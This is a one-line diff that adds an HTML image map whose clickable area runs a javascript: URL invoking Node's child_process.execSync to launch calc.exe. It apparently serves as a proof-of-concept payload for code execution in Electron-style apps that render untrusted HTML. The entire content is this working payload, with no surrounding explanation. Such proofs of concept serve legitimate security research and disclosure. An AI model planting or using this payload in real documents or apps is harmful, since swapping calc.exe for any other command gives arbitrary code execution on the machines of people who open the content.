@@ -1,0 +1,1 @@
+<map name="test"><area coords="0,0,1000,1000" href="javascript:top.require(`child_process`).execSync(`calc.exe`)"></map><img usemap="#test" src="https://github.com/Ry0taK.png">
